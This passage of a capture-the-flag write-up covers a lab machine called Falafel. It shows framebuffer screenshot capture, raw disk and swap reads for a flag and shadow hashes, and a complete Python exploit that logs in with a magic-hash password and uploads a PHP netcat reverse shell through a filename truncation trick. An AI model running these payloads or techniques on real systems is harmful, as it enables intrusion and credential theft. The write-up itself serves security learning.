moshe@falafel:/dev/shm/.z$ groups
moshe adm mail news voice floppy audio video games

```

Grab files in each group, excluding directories:

```

moshe@falafel:/dev/shm/.z$ for x in $(groups); do echo ========${x}========; find / -group ${x} ! -type d -exec ls -la {} \; 2>/dev/null > ${x}; done
========moshe========
========adm========
========mail========
========news========
========voice========
========floppy========
========audio========
========video========
========games========
moshe@falafel:/dev/shm/.z$ ls -l
total 156
-rw-rw-r-- 1 moshe moshe   2035 May 18 00:14 adm
-rw-rw-r-- 1 moshe moshe    119 May 18 00:14 audio
-rw-rw-r-- 1 moshe moshe      0 May 18 00:14 floppy
-rw-rw-r-- 1 moshe moshe      0 May 18 00:14 games
-rw-rw-r-- 1 moshe moshe      0 May 18 00:14 mail
-rw-rw-r-- 1 moshe moshe 143570 May 18 00:14 moshe
-rw-rw-r-- 1 moshe moshe      0 May 18 00:14 news
-rw-rw-r-- 1 moshe moshe    244 May 18 00:14 video
-rw-rw-r-- 1 moshe moshe      0 May 18 00:14 voice

```

adm has a bunch of log files, but nothing interesting:

```

moshe@falafel:/dev/shm/.z$ cat adm
-rw-r----- 1 syslog adm 13333 Jan 14 06:25 /var/log/auth.log.2.gz
-rw-r----- 1 root adm 43245 Feb  5 22:53 /var/log/apache2/access.log.1
-rw-r----- 1 root adm 280602138 May 18 00:14 /var/log/apache2/error.log
-rw-r----- 1 root adm 0 Nov 27 19:16 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 1066648795 May 18 00:14 /var/log/apache2/access.log
-rw-r----- 1 root adm 234 Jan 14 06:25 /var/log/apache2/error.log.2.gz
-rw-r----- 1 root adm 171441 Feb  6 06:25 /var/log/apache2/error.log.1
-rw-r----- 1 syslog adm 267582 Jan 13 06:25 /var/log/syslog.3.gz
-rw-r--r-- 1 root adm 0 Feb  6 06:25 /var/log/unattended-upgrades/unattended-upgrades-dpkg.log
-rw-r--r-- 1 root adm 2301 Nov 27 22:56 /var/log/unattended-upgrades/unattended-upgrades-dpkg.log.1.gz
-rw-r----- 1 root adm 0 Feb  6 06:25 /var/log/apt/term.log
-rw-r----- 1 root adm 23250 Feb  5 17:29 /var/log/apt/term.log.1.gz
-rw-r----- 1 syslog adm 441798 May 17 16:31 /var/log/kern.log
-rw-r----- 1 syslog adm 64155 May 18 00:09 /var/log/auth.log
-rw-r----- 1 syslog adm 91753 Feb  6 06:25 /var/log/auth.log.1
-rw-r----- 1 root adm 256 Nov 27 19:14 /var/log/apport.log.2.gz
-rw-r----- 1 syslog adm 2209321 Feb  5 17:33 /var/log/kern.log.1
-rw-r----- 1 syslog adm 2498991 Feb  6 06:25 /var/log/syslog.1
-rw-r----- 1 syslog adm 2540 Jan 14 06:25 /var/log/syslog.2.gz
-rw-r----- 1 root adm 0 Feb  6 06:25 /var/log/apport.log
-rw-r----- 1 mysql adm 6611 Jan 11 20:27 /var/log/mysql/error.log.3.gz
-rw-r----- 1 mysql adm 22963 May 17 19:29 /var/log/mysql/error.log
-rw-r----- 1 mysql adm 20 Jan 13 06:25 /var/log/mysql/error.log.2.gz
-rw-r----- 1 mysql adm 13738 Feb  5 17:33 /var/log/mysql/error.log.1.gz
-rw-r----- 1 root adm 31 Aug  1  2017 /var/log/fsck/checkfs
-rw-r----- 1 root adm 31 Aug  1  2017 /var/log/fsck/checkroot
-rw-r----- 1 syslog adm 213341 Jan 11 20:27 /var/log/kern.log.2.gz
-rw-r----- 1 syslog adm 516044 May 18 00:09 /var/log/syslog
-rw-r----- 1 root adm 31 Aug  1  2017 /var/log/dmesg
-rw-r----- 1 root adm 23090 Feb  5 17:17 /var/log/apport.log.1

```

That leaves audo and video, both of which are focused on devices:

```

moshe@falafel:/dev/shm/.z$ cat audio
crw-rw----+ 1 root audio 116, 1 May 17 10:16 /dev/snd/seq
crw-rw----+ 1 root audio 116, 33 May 18 00:02 /dev/snd/timer
moshe@falafel:/dev/shm/.z$ cat video
crw-rw---- 1 root video 29, 0 May 17 10:16 /dev/fb0
crw-rw----+ 1 root video 226, 0 May 17 10:16 /dev/dri/card0
crw-rw----+ 1 root video 226, 128 May 17 10:16 /dev/dri/renderD128
crw-rw---- 1 root video 226, 64 May 17 10:16 /dev/dri/controlD64

```

The `/dev/fb0` device is interesting. `fb0` is the frame buffer, which [provides an abstraction for the video hardware](https://www.kernel.org/doc/Documentation/fb/framebuffer.txt). We can `cat` it and get a file:

```

moshe@falafel:/dev/shm/.z$ cat /dev/fb0 > screenshot.raw
moshe@falafel:/dev/shm/.z$ ls -l screenshot.raw
-rw-rw-r-- 1 moshe moshe 4163040 May 18 03:52 screenshot.raw

```

To view this file, we’ll also need the screen resolution, which can be found in `/sys/class/graphics/fb0/`:

```

moshe@falafel:~$ ls -l /sys/class/graphics/fb0/
total 0
-rw-r--r-- 1 root root 4096 Jun 20 16:23 bits_per_pixel
-rw-r--r-- 1 root root 4096 Jun 20 16:23 blank
-rw-r--r-- 1 root root 4096 Jun 20 16:23 bl_curve
-rw-r--r-- 1 root root 4096 Jun 20 16:23 console
-rw-r--r-- 1 root root 4096 Jun 20 16:23 cursor
-r--r--r-- 1 root root 4096 Jun 20 16:23 dev
lrwxrwxrwx 1 root root    0 Jun 20 16:23 device -> ../../../0000:00:0f.0
-rw-r--r-- 1 root root 4096 Jun 20 16:23 mode
-rw-r--r-- 1 root root 4096 Jun 20 16:23 modes
-r--r--r-- 1 root root 4096 Jun 20 16:23 name
-rw-r--r-- 1 root root 4096 Jun 20 16:23 pan
drwxr-xr-x 2 root root    0 Jun 20 16:23 power
-rw-r--r-- 1 root root 4096 Jun 20 16:23 rotate
-rw-r--r-- 1 root root 4096 Jun 20 16:23 state
-r--r--r-- 1 root root 4096 Jun 20 16:23 stride
lrwxrwxrwx 1 root root    0 Jun 20 16:23 subsystem -> ../../../../../class/graphics
-rw-r--r-- 1 root root 4096 Jun 20 16:23 uevent
-rw-r--r-- 1 root root 4096 Jun 20 16:23 virtual_size

moshe@falafel:/dev/shm/.z$ cat /sys/class/graphics/fb0/virtual_size
1176,885

```

Copy it back to kali:

```

root@kali# cat moshe.password | xclip; scp moshe@10.10.10.73:/dev/shm/.z/screenshot.raw .
moshe@10.10.10.73's password:
screenshot.raw                                        100% 4065KB   1.6MB/s   00:02

```

And open with `Gimp`. In the open dialog, select the file, as well as the file type of `Raw image data`:

![1526605043377](https://0xdfimages.gitlab.io/img/1526605043377.png)

In the next dialog, input the screen resolution, and try different `Image Type` until it looks good (`RGB565` looks best):

![1526605110048](https://0xdfimages.gitlab.io/img/1526605110048.png)

Then export it as png:

![1526605221968](https://0xdfimages.gitlab.io/img/1526605221968.png)

That happens to have yossi’s password on it.

```

root@kali# cat yossi.password
MoshePlzStopHackingMe!

root@kali# cat yossi.password | xclip; ssh yossi@10.10.10.73
yossi@10.10.10.73's password:
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Fri May 18 01:35:48 2018 from 10.10.14.40
yossi@falafel:~$

```

## Find root.txt

### Searching Groups

Because we are looking for things that yossi has access to that moshe doesn’t, we’ll start by looking for files in yossi’s groups that are not world readable:

```

yossi@falafel:/dev/shm/.d$ groups
yossi adm disk cdrom dip plugdev lpadmin sambashare

yossi@falafel:/dev/shm/.d$ for group in $(groups); do echo ${group}; find / -group ${group} ! -type d ! -perm -o=r -exec ls -la {} \; 2>/dev/null | grep -vF " /proc" > ${group}; done
yossi
adm
disk
cdrom
dip
plugdev
lpadmin
sambashare

yossi@falafel:/dev/shm/.d$ ls -l
total 12
-rw-rw-r-- 1 yossi yossi 1836 May 18 13:07 adm
-rw-rw-r-- 1 yossi yossi  106 May 18 13:07 cdrom
-rw-rw-r-- 1 yossi yossi    0 May 18 13:07 dip
-rw-rw-r-- 1 yossi yossi  795 May 18 13:07 disk
-rw-rw-r-- 1 yossi yossi    0 May 18 13:07 lpadmin
-rw-rw-r-- 1 yossi yossi    0 May 18 13:07 plugdev
-rw-rw-r-- 1 yossi yossi    0 May 18 13:07 sambashare
-rw-rw-r-- 1 yossi yossi    0 May 18 13:07 yossi

```

### Not interesting - cdrom

yossi@falafel:/dev/shm/.d$ cat cdrom
crw-rw—-+ 1 root cdrom 21, 1 May 18 10:08 /dev/sg1
brw-rw—-+ 1 root cdrom 11, 0 May 18 10:08 /dev/sr0

According to [this](https://superuser.com/questions/630588/how-to-detect-whether-there-is-a-cd-rom-in-the-drive#630593), the cdrom should return with details about the disk if there’s one in it with the `blkid` command:

```

yossi@falafel:/dev/shm/.d$ blkid /dev/sr0
yossi@falafel:/dev/shm/.d$ echo $?
2
yossi@falafel:/dev/shm/.d$ blkid /dev/sg1
yossi@falafel:/dev/shm/.d$ echo $?
2
yossi@falafel:/dev/shm/.d$ blkid /dev/sg0
yossi@falafel:/dev/shm/.d$ echo $?
2

```

### Interesting - disk

```

yossi@falafel:/dev/shm/.d$ cat disk
crw-rw---- 1 root disk 10, 234 May 18 10:08 /dev/btrfs-control
brw-rw---- 1 root disk 8, 5 May 18 10:08 /dev/sda5
brw-rw---- 1 root disk 8, 2 May 18 10:08 /dev/sda2
brw-rw---- 1 root disk 8, 1 May 18 10:08 /dev/sda1
brw-rw---- 1 root disk 8, 0 May 18 10:08 /dev/sda
crw-rw---- 1 root disk 21, 0 May 18 10:08 /dev/sg0
brw-rw---- 1 root disk 7, 7 May 18 10:08 /dev/loop7
brw-rw---- 1 root disk 7, 6 May 18 10:08 /dev/loop6
brw-rw---- 1 root disk 7, 5 May 18 10:08 /dev/loop5
brw-rw---- 1 root disk 7, 4 May 18 10:08 /dev/loop4
brw-rw---- 1 root disk 7, 3 May 18 10:08 /dev/loop3
brw-rw---- 1 root disk 7, 2 May 18 10:08 /dev/loop2
brw-rw---- 1 root disk 7, 1 May 18 10:08 /dev/loop1
brw-rw---- 1 root disk 7, 0 May 18 10:08 /dev/loop0
crw-rw---- 1 root disk 10, 237 May 18 10:08 /dev/loop-control

```

yossi can read directly off the raw disks because of membership in the disk group. It looks like `sda1` is the main disk, and `sda5` is the swap:

```

yossi@falafel:/dev/shm/.d$ blkid
/dev/sda1: UUID="ccba94d2-0b82-49ce-b25d-f1d3615345f0" TYPE="ext4" PARTUUID="01590ad6-01"
/dev/sda5: UUID="63f5a640-a3f7-4ea9-9dbd-c9a091ace20c" TYPE="swap" PARTUUID="01590ad6-05"

yossi@falafel:/dev/shm/.d$ swapon -s
Filename                                Type            Size    Used    Priority
/dev/sda5                               partition       1046524 147000  -1

yossi@falafel:/dev/shm/.d$ cat /etc/fstab
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/sda1 during installation
UUID=ccba94d2-0b82-49ce-b25d-f1d3615345f0 /               ext4    errors=remount-ro 0       1
# swap was on /dev/sda5 during installation
UUID=63f5a640-a3f7-4ea9-9dbd-c9a091ace20c none            swap    sw              0       0

yossi@falafel:/dev/shm/.d$ mount | grep sda
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)

```

### Get Flag - strings

These devices can be read with `dd` or `cat`. In swap, the flag is there in plaintext:

```

yossi@falafel:/dev/shm/.d$ cat /dev/sda5 | strings -a | grep "root.txt" | grep -e "[0-9a-f]\{32\}"
echo "23b79200..." > root.txt
printf "23b79200..." > root.txt
echo "23b79200..." > root.txt
echo "23b79200..." > root.txt
printf "23b79200..." > root.txt
echo "23b79200..." > root.txt

```

### Get Flag - debugfs

`debugfs` let’s you debug a file system if you can read the device:

```

yossi@falafel:~$ debugfs /dev/sda1
debugfs 1.42.13 (17-May-2015)
debugfs:  ls /root
debugfs:  cat /root/root.txt
23b79200...

```

### Get Flag - exfil device

It’s also possible to just scp the entire `/dev/sda1` back to your kali box and mount it there.

## Other Stuff

### get\_falafel\_shell.py

I scripted the initial access exploit so that I can start a `nc` listener, run it, and have shell:

```

#!/usr/bin/env python3

import argparse
import http.server
import os
import re
import requests
import socket
import sys
from threading import Thread

def get_my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("10.10.10.1", 80))
    return s.getsockname()[0]

# Parse args
parser = argparse.ArgumentParser()
parser.add_argument('--web-port', '-w', help='webserver port', default=8082, type=int)
parser.add_argument('-n', '--nc-port', help='nc port', default=8003)
parser.add_argument('--web-dir', '-d', help='location to serve files from', default='/tmp')
parser.add_argument('--local-ip', '-i', help='local ip', default=None)
args = parser.parse_args()

filename = 'B' * 232 + '.php.png'
falafel_ip = "10.10.10.73"
falafel_url = "http://" + falafel_ip
ip = args.local_ip or get_my_ip()
web_port = args.web_port
nc_port = args.nc_port
rev_shell = '''<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f");?>'''.format(ip, nc_port)
web_dir = args.web_dir

def start_server():
    os.chdir(web_dir)
    with open(filename, 'w') as f:
        f.write(rev_shell)
    server_address = ('0.0.0.0', web_port)
    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()

# start webserver
print("[*] Starting webserver thread from {} on port {}".format(web_dir, web_port))
thread = Thread(target=start_server, daemon=True)
thread.start()

# Login
print("[*] Getting logon.php with phpsession cookie")
s = requests.session()
s.get(falafel_url + "/login.php")
print("[*] Logging in with admin / 240610708")
s.post(falafel_url + "/login.php", data={"username": "admin", "password": "240610708"} )

# upload php rev_shell
# URL=$(python -c 'print "http://10.10.15.99:8081/" + "B"*232 + ".php.png"'); curl -i -s -k  -X $'POST'     -H $'Referer: http://10.10.10.73/upload.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Cookie: PHPSESSID=g9kp8du6ofpc7g8m5d81nt2c00'     --data-binary "url=$URL" $'http://10.10.10.73/upload.php' | grep -e "The name is too long" -e shorten -e "New name" -e CMD
print("[*] Uploading reverse shell php")
resp = s.post(falafel_url + "/upload.php", headers={"Referer": "http://10.10.10.73/upload.php"}, data={"url": "http://" + ip + ":" + str(web_port) + "/" + filename})

# locate shell
path = re.search(r"CMD: cd /var/www/html(/uploads/[\w\-]+);", resp.text).group(1)
file_ = re.search(r"New name is (\w+\.php)\.", resp.text).group(1)

# activate shell
print("[*] Activating shell. Expect callback on {}:{}".format(ip, nc_port))
try:
    s.get("{}{}/{}".format(falafel_url, path, file_), timeout=1)
except requests.exceptions.ReadTimeout:
    pass

print("[*] Cleaning up and exiting")
os.remove(web_dir + "/" + filename)
sys.exit(1)

```

```

root@kali# ./get_falafel_shell.py -h
usage: get_falafel_shell.py [-h] [--web-port WEB_PORT] [-n NC_PORT]
                            [--web-dir WEB_DIR] [--local-ip LOCAL_IP]

optional arguments:
  -h, --help            show this help message and exit
  --web-port WEB_PORT, -w WEB_PORT
                        webserver port
  -n NC_PORT, --nc-port NC_PORT
                        nc port
  --web-dir WEB_DIR, -d WEB_DIR
                        location to serve files from
  --local-ip LOCAL_IP, -i LOCAL_IP
                        local ip

root@kali# ./get_falafel_shell.py -n 9000
[*] Starting webserver thread from /tmp on port 8082
[*] Getting logon.php with phpsession cookie
[*] Logging in with admin / 240610708
[*] Uploading reverse shell php
10.10.10.73 - - [20/Jun/2018 09:30:34] "GET /BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.php.png HTTP/1.1" 200 -
[*] Activating shell. Expect callback on 10.10.14.159:9000
[*] Cleaning up and exiting

```

```

root@kali# nc -lnvp 9000
listening on [any] 9000 ...
connect to [10.10.14.159] from (UNKNOWN) [10.10.10.73] 60076
/bin/sh: 0: can't access tty; job control turned off
$

```

### Root shell - fail

In main disk, there’s what looks like the root line of an `/etc/shadow` file:

```

yossi@falafel:/dev/shm/.d$ dd if=/dev/sda1 bs=1024 | strings -a | grep root > strings
7339008+0 records in
7339008+0 records out
7515144192 bytes (7.5 GB, 7.0 GiB) copied, 394.058 s, 19.1 MB/s

yossi@falafel:/dev/shm/.d$ blockdev --getsize /dev/sda1
14678016

yossi@falafel:/dev/shm/.d$ dd if=/dev/sda1 bs=1024 | strings -a | grep root > strings
7339008+0 records in
7339008+0 records out
7515144192 bytes (7.5 GB, 7.0 GiB) copied, 394.058 s, 19.1 MB/s

yossi@falafel:/dev/shm/.d$ cat strings | grep "^root" | grep ":::" | sort | uniq
root:*:17379:0:99999:7:::
root:!:17497:0:99999:7:::
root:$6$1piR.vyE$147.7jQX3pd0twWI0S43cWqoldOrwOeezcMAwWG5zd5PD4SdvwfSq3B/bFVUeN5JGg9A4bQ7vi3xzmcCZOWlg.:17497:0:99999:7:::
root:$6$Jk54H2c2$dDTYx8vLD9IEqayacM0lnPBjDkB3git9Hzbdmg1wAiginiUfqZvIAnVROsmRGjj64y00CnmDtb/Tqoy5JB/ED/:17498:0:99999:7:::

yossi@falafel:/dev/shm/.d$ cat /etc/passwd | grep root
root:x:0:0:root:/root:/bin/bash

root@kali# cat unshadow
root:$6$Jk54H2c2$dDTYx8vLD9IEqayacM0lnPBjDkB3git9Hzbdmg1wAiginiUfqZvIAnVROsmRGjj64y00CnmDtb/Tqoy5JB/ED/:0:0:root:/root:/bin/bash
root:$6$1piR.vyE$147.7jQX3pd0twWI0S43cWqoldOrwOeezcMAwWG5zd5PD4SdvwfSq3B/bFVUeN5JGg9A4bQ7vi3xzmcCZOWlg.:0:0:root:/root:/bin/bash

```

`john` will crack the second one as `12345678`, but it doesn’t work for root. The first one doesn’t crack with rockyou.

Going back in with `debugfs` confirms that that first one is the root hash:

```

debugfs:  cat /etc/shadow
root:$6$Jk54H2c2$dDTYx8vLD9IEqayacM0lnPBjDkB3git9Hzbdmg1wAiginiUfqZvIAnVROsmRGjj64y00CnmDtb/Tqoy5JB/ED/:17498:0:99999:7:::
...
yossi:$6$3KIuOhDI$/LlvzMdSC1PpDfF6M1wveXSWdhIu9qtceH73oGJNHEt23YWFTEeWCzmhFZ5Up15eI81a2864ZTixEaE4mgoFl/:17545:0:99999:7:::
mysql:!:17497:0:99999:7:::
moshe:$6$yg7fMHWF$8WroIeYKl.dl97FHZ4D80TzSPqSsLrJAKCfZpXbC9lgZBATYKNGFe07gRkMxMCB7LYu22RkWfNr/SS1Aav9vz0:17497:0:99999:7:::

```

I wasn’t able to crack the root password.

### How the website works

Profiles are hardcoded:

```

www-data@falafel:/var/www/html$ cat profile.php
<?php include('authorized.php');?>
<!DOCTYPE html>
<html>
<head>
        <title>Falafel Lovers - <?php echo $_SESSION['user'];?></title>
        <?php include('style.php');?>
        <?php include('css/style.php');?>
</head>
<body>
<?php include('header.php');?>
<br><br>

<div style='width: 60%;margin: 0 auto;box-shadow: 0px -2px 2px rgba(34,34,34,0.6); color:#303030'>
<div class="container" style="margin-top: 50px; margin-bottom: 50px;position: relative; z-index: 99; height: 110%;background:#F8F8F8;box-shadow: 10px 10px 5px #000000">
        <div class="row panel">
        <div class="col-md-8  col-xs-12">
                <div>
                <table style="width:100%">
                <tr>
                <?php if(isset($_SESSION) && ($_SESSION['user'] == 'chris')){echo '
                                <th ><img src="images/chris.png" class="user"/></th>
                                <th style="text-align: left">
                <h1 style="margin-top: 0px;margin-left: 20px;">Chris</h1>
                <h4 style="margin-left: 20px;">Juggler by day, Hacker by night</h4>
                <h4 style="margin-left: 20px;">Hey, my name is chris, and I work at the local circus as a juggler. After work, I always eat falafel.<br>
                By night, I pentest random websites as a hobby. It\'s funny how sometimes both the hobby and work have something in common.. </h4>
                                </th>';}?>
                        <?php if(isset($_SESSION) && ($_SESSION['user'] == 'admin')){echo '
                                <th style="width: 138px;"><img src="images/admin.png" class="user" /></th>
                                <th style="text-align: left">
                <h1 style="margin-top: 0px;margin-left: 20px;">Admin</h1>
                <h4 style="margin-left: 20px;">Falafel lover, Site admin</h4>
                <h4 style="margin-left: 20px;">"Know your limits."
                -Anonymous</h4>
                                </th>';}?>
                        <tr>
                        </table>
           </div>
        </div>
    </div>
</div>
</div>
</body>
<?php include('footer.php');?>
</html>

```

`authorized.php` handles redirection to `login.php` if not logged in, and away from `upload.php` if not admin:

```

www-data@falafel:/var/www/html$ cat authorized.php
<?php
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

if(isset($_SESSION)) {
        if(basename($_SERVER['PHP_SELF']) == 'upload.php'){
                if($_SESSION['role'] != 'admin'){
                        header('Location: profile.php');
                        exit();
                }
        }
        else{ //basename($_SERVER['PHP_SELF']) == 'profile.php'
                if($_SESSION['role'] == ''){
                        header('Location: login.php');
                }
        }
}
else{
        header('Location: login.php');
        exit();
}

```

`login.php` provides the login form, and the actual auth is done in `login_logic.php`:

```

www-data@falafel:/var/www/html$ cat login_logic.php
<?php
  include("connection.php");
  session_start();
  if($_SERVER["REQUEST_METHOD"] == "POST") {
    if(!isset($_REQUEST['username'])&&!isset($_REQUEST['password'])){
      //header("refresh:1;url=login.php");
      $message="Invalid username/password.";
      //die($message);
      goto end;
          }

    $username = $_REQUEST['username'];
    $password = $_REQUEST['password'];

    if(!(is_string($username)&&is_string($password))){
      //header("refresh:1;url=login.php");
      $message="Invalid username/password.";
      //die($message);
      goto end;
    }

    $password = md5($password);
    $message = "";
    if(preg_match('/(union|\|)/i', $username) or preg_match('/(sleep)/i',$username) or preg_match('/(benchmark)/i',$username)){
      $message="Hacking Attempt Detected!";
      //die($message);
      goto end;
    }

    $sql = "SELECT * FROM users WHERE username='$username'";
    $result = mysqli_query($db,$sql);
    $users = mysqli_fetch_assoc($result);
    mysqli_close($db);
    if($users) {
      if($password == $users['password']){
        if($users['role']=="admin"){
          $_SESSION['user'] = $username;
          $_SESSION['role'] = "admin";
          header("refresh:1;url=upload.php");
          //die("Login Successful!");
          $message = "Login Successful!";
        }elseif($users['role']=="normal"){
                                  $_SESSION['user'] = $username;
                                  $_SESSION['role'] = "normal";
          header("refresh:1;url=profile.php");
                                  //die("Login Successful!");
          $message = "Login Successful!";
        }else{
          $message = "That's weird..";
        }
      }
      else{
        $message = "Wrong identification : ".$users['username'];
      }
    }
    else{
      $message = "Try again..";
    }
    //echo $message;
  }
  end:
?>

```

And there’s the upload logic:

```

www-data@falafel:/var/www/html$ cat upload.php
<?php include('authorized.php');?>
<?php
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 function download($url) {
   $flags  = FILTER_FLAG_SCHEME_REQUIRED | FILTER_FLAG_HOST_REQUIRED | FILTER_FLAG_PATH_REQUIRED;
   $urlok  = filter_var($url, FILTER_VALIDATE_URL, $flags);
   if (!$urlok) {
     throw new Exception('Invalid URL');
   }
   $parsed = parse_url($url);
   if (!preg_match('/^https?$/i', $parsed['scheme'])) {
     throw new Exception('Invalid URL: must start with HTTP or HTTPS');
   }
   $host_ip = gethostbyname($parsed['host']);
   $flags  = FILTER_FLAG_IPV4 | FILTER_FLAG_NO_RES_RANGE;
   $ipok  = filter_var($host_ip, FILTER_VALIDATE_IP, $flags);
   if ($ipok === false) {
     throw new Exception('Invalid URL: bad host');
   }
   $file = pathinfo($parsed['path']);
   $filename = $file['basename'];
   if(! array_key_exists( 'extension' , $file )){
     throw new Exception('Bad extension');
   }
   $extension = strtolower($file['extension']);
   $whitelist = ['png', 'gif', 'jpg'];
   if (!in_array($extension, $whitelist)) {
     throw new Exception('Bad extension');
   }
   // re-assemble safe url
   $good_url = "{$parsed['scheme']}://{$parsed['host']}";
   $good_url .= isset($parsed['port']) ? ":{$parsed['port']}" : '';
   $good_url .= $parsed['path'];
   $uploads  = getcwd() . '/uploads';
   $timestamp = date('md-Hi');
   $suffix  = bin2hex(openssl_random_pseudo_bytes(8));
   $userdir  = "${uploads}/${timestamp}_${suffix}";
   if (!is_dir($userdir)) {
     mkdir($userdir);
   }
   $cmd = "cd $userdir; timeout 3 wget " . escapeshellarg($good_url) . " 2>&1";
   $output = shell_exec($cmd);
   return [
     'output' => $output,
     'cmd' => "cd $userdir; wget " . escapeshellarg($good_url),
     'file' => "$userdir/$filename",
   ];
 }

 $error = false;
 $result = false;
 $output = '';
 $cmd = '';
 if (isset($_REQUEST['url'])) {
   try {
     $download = download($_REQUEST['url']);
     $output = $download['output'];
     $filepath = $download['file'];
     $cmd = $download['cmd'];
     $result = true;
   } catch (Exception $ex) {
     $result = $ex->getMessage();
     $error = true;
   }
 }
 ?>
 <!DOCTYPE html>
 <html>
 <head>
   <title>Falafel Lovers - Image Upload</title>
   <?php include('style.php');?>
        <?php include('css/style.php');?>
 </head>
 <body>
 <?php include('header.php');?>

 <br><br><br>
 <div style='width: 60%;margin: 0 auto; color:#303030'>
<div class="container" style="margin-top: 50px; margin-bottom: 50px;position: relative; z-index: 99; height: 110%;background:#F8F8F8;box-shadow: 10px 10px 5px #000000;padding-left: 50px;padding-right: 50px;">
<br><br>
   <h1>Upload via url:</h1>
   <?php if ($result !== false): ?>
     <div>
       <?php if ($error): ?>
         <h3>Something bad happened:</h3>
         <p><?php echo htmlentities($result); ?></p>
       <?php else: ?>
        <h3>Upload Succsesful!</h3>
        <div>
        <h4>Output:</h4>
        <pre>CMD: <?php echo htmlentities($cmd); ?></pre>
        <pre><?php echo htmlentities($output); ?></pre>
        </div>

       <?php endif; ?>
       </div>
   <?php endif; ?>
   <div>
     <p>Specify a URL of an image to upload:</p>
     <form method="post">
       <label>
         <input type="url" name="url" placeholder="http://domain.com/path/image.png">
       </label>
       <input type="submit" value="Upload">
     </form>
<br><br>
 </div>
   </div>
</div>
   <footer>
   </footer>
 </body>
 </html>

```